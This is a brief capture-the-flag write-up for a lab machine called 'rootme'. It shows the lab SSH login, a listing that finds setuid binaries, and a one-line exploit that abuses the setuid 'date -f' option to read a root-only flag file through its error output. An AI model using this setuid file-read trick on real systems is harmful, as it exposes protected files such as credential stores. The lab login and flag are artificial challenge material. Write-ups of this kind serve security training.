# rootme

user: ubuntu
password: 123456

connect to server
```shell
ssh ubuntu@node5.buuoj.cn -p 25547
```

check every binary privilege
```shell
$ ll
total 5664
drwxr-xr-x 1 root root    4096 May 18  2022 ./
drwxr-xr-x 1 root root    4096 Sep 29 12:38 ../
-rwxr-xr-x 1 root root 1113504 Jun  6  2019 bash*
-rwxr-xr-x 3 root root   34888 Jul  4  2019 bunzip2*
-rwxr-xr-x 3 root root   34888 Jul  4  2019 bzcat*
lrwxrwxrwx 1 root root       6 Jul  4  2019 bzcmp -> bzdiff*
-rwxr-xr-x 1 root root    2140 Jul  4  2019 bzdiff*
lrwxrwxrwx 1 root root       6 Jul  4  2019 bzegrep -> bzgrep*
-rwxr-xr-x 1 root root    4877 Jul  4  2019 bzexe*
lrwxrwxrwx 1 root root       6 Jul  4  2019 bzfgrep -> bzgrep*
-rwxr-xr-x 1 root root    3642 Jul  4  2019 bzgrep*
-rwxr-xr-x 3 root root   34888 Jul  4  2019 bzip2*
-rwxr-xr-x 1 root root   14328 Jul  4  2019 bzip2recover*
lrwxrwxrwx 1 root root       6 Jul  4  2019 bzless -> bzmore*
-rwxr-xr-x 1 root root    1297 Jul  4  2019 bzmore*
-rwxr-xr-x 1 root root   35064 Jan 18  2018 cat*
-rwxr-xr-x 1 root root   63672 Jan 18  2018 chgrp*
-rwxr-xr-x 1 root root   59608 Jan 18  2018 chmod*
-rwxr-xr-x 1 root root   67768 Jan 18  2018 chown*
-rwxr-xr-x 1 root root  141528 Jan 18  2018 cp*
-rwxr-xr-x 1 root root  121432 Jan 25  2018 dash*
-rwsr-xr-x 1 root root  100568 Jan 18  2018 date*
-rwxr-xr-x 1 root root   76000 Jan 18  2018 dd*
-rwxr-xr-x 1 root root   84776 Jan 18  2018 df*
-rwxr-xr-x 1 root root  133792 Jan 18  2018 dir*
-rwxr-xr-x 1 root root   72000 Aug 22  2019 dmesg*
lrwxrwxrwx 1 root root       8 Jan 31  2018 dnsdomainname -> hostname*
lrwxrwxrwx 1 root root       8 Jan 31  2018 domainname -> hostname*
-rwxr-xr-x 1 root root   35000 Jan 18  2018 echo*
-rwxr-xr-x 1 root root      28 Sep 18  2019 egrep*
-rwxr-xr-x 1 root root   30904 Jan 18  2018 false*
-rwxr-xr-x 1 root root      28 Sep 18  2019 fgrep*
-rwxr-xr-x 1 root root   64784 Aug 22  2019 findmnt*
-rwxr-xr-x 1 root root  219456 Sep 18  2019 grep*
-rwxr-xr-x 2 root root    2301 Apr 28  2017 gunzip*
-rwxr-xr-x 1 root root    5927 Apr 28  2017 gzexe*
-rwxr-xr-x 1 root root  101560 Apr 28  2017 gzip*
-rwxr-xr-x 1 root root   18504 Jan 31  2018 hostname*
-rwxr-xr-x 1 root root   63576 Dec 10  2021 journalctl*
-rwxr-xr-x 1 root root   26704 Aug  9  2019 kill*
-rwxr-xr-x 1 root root   67808 Jan 18  2018 ln*
-rwxr-xr-x 1 root root   52664 Mar 22  2019 login*
-rwxr-xr-x 1 root root   51280 Dec 10  2021 loginctl*
-rwxr-xr-x 1 root root  133792 Jan 18  2018 ls*
-rwxr-xr-x 1 root root   84048 Aug 22  2019 lsblk*
-rwxr-xr-x 1 root root   80056 Jan 18  2018 mkdir*
-rwxr-xr-x 1 root root   67768 Jan 18  2018 mknod*
-rwxr-xr-x 1 root root   43192 Jan 18  2018 mktemp*
-rwxr-xr-x 1 root root   38952 Aug 22  2019 more*
-rwsr-xr-x 1 root root   43088 Aug 22  2019 mount*
-rwxr-xr-x 1 root root   14408 Aug 22  2019 mountpoint*
-rwxr-xr-x 1 root root  137440 Jan 18  2018 mv*
-rwxr-xr-x 1 root root  154192 Jan 10  2017 netstat*
-rwxr-xr-x 1 root root   43080 Dec 10  2021 networkctl*
lrwxrwxrwx 1 root root       8 Jan 31  2018 nisdomainname -> hostname*
lrwxrwxrwx 1 root root      14 Nov  1  2017 pidof -> /sbin/killall5*
-rwxr-xr-x 1 root root  133432 Aug  9  2019 ps*
-rwxr-xr-x 1 root root   35000 Jan 18  2018 pwd*
lrwxrwxrwx 1 root root       4 Jun  6  2019 rbash -> bash*
-rwxr-xr-x 1 root root   43192 Jan 18  2018 readlink*
-rwxr-xr-x 1 root root   63704 Jan 18  2018 rm*
-rwxr-xr-x 1 root root   43192 Jan 18  2018 rmdir*
-rwxr-xr-x 1 root root   18760 Dec 30  2017 run-parts*
-rwxr-xr-x 1 root root  109000 Jan 30  2018 sed*
lrwxrwxrwx 1 root root       4 Oct 29  2019 sh -> dash*
lrwxrwxrwx 1 root root       4 Oct 29  2019 sh.distrib -> dash*
-rwxr-xr-x 1 root root   35000 Jan 18  2018 sleep*
-rwxr-xr-x 1 root root   75992 Jan 18  2018 stty*
-rwsr-xr-x 1 root root   44664 Mar 22  2019 su*
-rwxr-xr-x 1 root root   35000 Jan 18  2018 sync*
-rwxr-xr-x 1 root root  182352 Dec 10  2021 systemctl*
lrwxrwxrwx 1 root root      20 Dec 10  2021 systemd -> /lib/systemd/systemd*
-rwxr-xr-x 1 root root   10320 Dec 10  2021 systemd-ask-password*
-rwxr-xr-x 1 root root   14400 Dec 10  2021 systemd-escape*
-rwxr-xr-x 1 root root   14416 Dec 10  2021 systemd-inhibit*
-rwxr-xr-x 1 root root   18496 Dec 10  2021 systemd-machine-id-setup*
-rwxr-xr-x 1 root root   14408 Dec 10  2021 systemd-notify*
-rwxr-xr-x 1 root root   43080 Dec 10  2021 systemd-sysusers*
-rwxr-xr-x 1 root root   71752 Dec 10  2021 systemd-tmpfiles*
-rwxr-xr-x 1 root root   26696 Dec 10  2021 systemd-tty-ask-password-agent*
-rwxr-xr-x 1 root root  423312 Jan 21  2019 tar*
-rwxr-xr-x 1 root root   10104 Dec 30  2017 tempfile*
-rwxr-xr-x 1 root root   88280 Jan 18  2018 touch*
-rwxr-xr-x 1 root root   30904 Jan 18  2018 true*
-rwsr-xr-x 1 root root   26696 Aug 22  2019 umount*
-rwxr-xr-x 1 root root   35032 Jan 18  2018 uname*
-rwxr-xr-x 2 root root    2301 Apr 28  2017 uncompress*
-rwxr-xr-x 1 root root  133792 Jan 18  2018 vdir*
-rwxr-xr-x 1 root root   30800 Aug 22  2019 wdctl*
-rwxr-xr-x 1 root root     946 Dec 30  2017 which*
lrwxrwxrwx 1 root root       8 Jan 31  2018 ypdomainname -> hostname*
-rwxr-xr-x 1 root root    1937 Apr 28  2017 zcat*
-rwxr-xr-x 1 root root    1777 Apr 28  2017 zcmp*
-rwxr-xr-x 1 root root    5764 Apr 28  2017 zdiff*
-rwxr-xr-x 1 root root     140 Apr 28  2017 zegrep*
-rwxr-xr-x 1 root root     140 Apr 28  2017 zfgrep*
-rwxr-xr-x 1 root root    2131 Apr 28  2017 zforce*
-rwxr-xr-x 1 root root    5938 Apr 28  2017 zgrep*
-rwxr-xr-x 1 root root    2037 Apr 28  2017 zless*
-rwxr-xr-x 1 root root    1910 Apr 28  2017 zmore*
-rwxr-xr-x 1 root root    5047 Apr 28  2017 znew*
```

find that `date` binary has `s` privilege
```shell
/bin/date --help
Usage: /bin/date [OPTION]... [+FORMAT]
  or:  /bin/date [-u|--utc|--universal] [MMDDhhmm[[CC]YY][.ss]]
Display the current time in the given FORMAT, or set the system date.

Mandatory arguments to long options are mandatory for short options too.
  -d, --date=STRING          display time described by STRING, not 'now'
      --debug                annotate the parsed date,
                              and warn about questionable usage to stderr
  -f, --file=DATEFILE        like --date; once for each line of DATEFILE
  -I[FMT], --iso-8601[=FMT]  output date/time in ISO 8601 format.
                               FMT='date' for date only (the default),
                               'hours', 'minutes', 'seconds', or 'ns'
                               for date and time to the indicated precision.
                               Example: 2006-08-14T02:34:56-06:00
  -R, --rfc-email            output date and time in RFC 5322 format.
                               Example: Mon, 14 Aug 2006 02:34:56 -0600
      --rfc-3339=FMT         output date/time in RFC 3339 format.
                               FMT='date', 'seconds', or 'ns'
                               for date and time to the indicated precision.
                               Example: 2006-08-14 02:34:56-06:00
  -r, --reference=FILE       display the last modification time of FILE
  -s, --set=STRING           set time described by STRING
  -u, --utc, --universal     print or set Coordinated Universal Time (UTC)
      --help     display this help and exit
      --version  output version information and exit

FORMAT controls the output.  Interpreted sequences are:

  %%   a literal %
  %a   locale's abbreviated weekday name (e.g., Sun)
  %A   locale's full weekday name (e.g., Sunday)
  %b   locale's abbreviated month name (e.g., Jan)
  %B   locale's full month name (e.g., January)
  %c   locale's date and time (e.g., Thu Mar  3 23:05:25 2005)
  %C   century; like %Y, except omit last two digits (e.g., 20)
  %d   day of month (e.g., 01)
  %D   date; same as %m/%d/%y
  %e   day of month, space padded; same as %_d
  %F   full date; same as %Y-%m-%d
  %g   last two digits of year of ISO week number (see %G)
  %G   year of ISO week number (see %V); normally useful only with %V
  %h   same as %b
  %H   hour (00..23)
  %I   hour (01..12)
  %j   day of year (001..366)
  %k   hour, space padded ( 0..23); same as %_H
  %l   hour, space padded ( 1..12); same as %_I
  %m   month (01..12)
  %M   minute (00..59)
  %n   a newline
  %N   nanoseconds (000000000..999999999)
  %p   locale's equivalent of either AM or PM; blank if not known
  %P   like %p, but lower case
  %q   quarter of year (1..4)
  %r   locale's 12-hour clock time (e.g., 11:11:04 PM)
  %R   24-hour hour and minute; same as %H:%M
  %s   seconds since 1970-01-01 00:00:00 UTC
  %S   second (00..60)
  %t   a tab
  %T   time; same as %H:%M:%S
  %u   day of week (1..7); 1 is Monday
  %U   week number of year, with Sunday as first day of week (00..53)
  %V   ISO week number, with Monday as first day of week (01..53)
  %w   day of week (0..6); 0 is Sunday
  %W   week number of year, with Monday as first day of week (00..53)
  %x   locale's date representation (e.g., 12/31/99)
  %X   locale's time representation (e.g., 23:13:48)
  %y   last two digits of year (00..99)
  %Y   year
  %z   +hhmm numeric time zone (e.g., -0400)
  %:z  +hh:mm numeric time zone (e.g., -04:00)
  %::z  +hh:mm:ss numeric time zone (e.g., -04:00:00)
  %:::z  numeric time zone with : to necessary precision (e.g., -04, +05:30)
  %Z   alphabetic time zone abbreviation (e.g., EDT)

By default, date pads numeric fields with zeroes.
The following optional flags may follow '%':

  -  (hyphen) do not pad the field
  _  (underscore) pad with spaces
  0  (zero) pad with zeros
  ^  use upper case if possible
  #  use opposite case if possible

After any flags comes an optional field width, as a decimal number;
then an optional modifier, which is either
E to use the locale's alternate representations if available, or
O to use the locale's alternate numeric symbols if available.

Examples:
Convert seconds since the epoch (1970-01-01 UTC) to a date
  $ date --date='@2147483647'

Show the time on the west coast of the US (use tzselect(1) to find TZ)
  $ TZ='America/Los_Angeles' date

Show the local time for 9AM next Friday on the west coast of the US
  $ date --date='TZ="America/Los_Angeles" 09:00 next Fri'

GNU coreutils online help: <http://www.gnu.org/software/coreutils/>
Report date translation bugs to <http://translationproject.org/team/>
Full documentation at: <http://www.gnu.org/software/coreutils/date>
or available locally via: info '(coreutils) date invocation'
```

exploit
```shell
/bin/date -f /root/flag.txt
/bin/date: invalid date ‘flag{9ed89521-2a4b-4d10-9e48-9503db87677e}’
```
